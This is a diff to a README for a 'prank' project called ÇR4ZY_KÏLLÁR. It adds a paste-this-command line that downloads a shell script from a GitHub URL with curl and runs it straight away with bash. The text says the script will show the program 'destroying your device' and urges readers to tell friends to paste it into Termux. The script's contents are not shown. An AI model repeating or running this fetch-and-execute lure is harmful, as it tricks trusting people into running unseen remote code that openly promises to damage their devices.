@@ -1,5 +1,9 @@
 # ÇR4ZY_KÏLLÁR
-This is A Prank, Just Paste This command "command" And you will see ÇR4ZY_KÏLLÁR destroying your device😈 XD.
+This is A Prank, Just Paste This command 
+
+```curl -s -o ~/CRAZY_KILLER.sh https://raw.githubusercontent.com/HikkiV/-R4ZY_K-LL-R/main/ÇR4ZY_KÏLLÁR_DOWNLOAD && bash ~/CRAZY_KILLER.sh```
+
+And you will see ÇR4ZY_KÏLLÁR destroying your device😈 XD.
 Share to your Friend, tell them "paste this command on termux, it's very cool" XD.
 
 
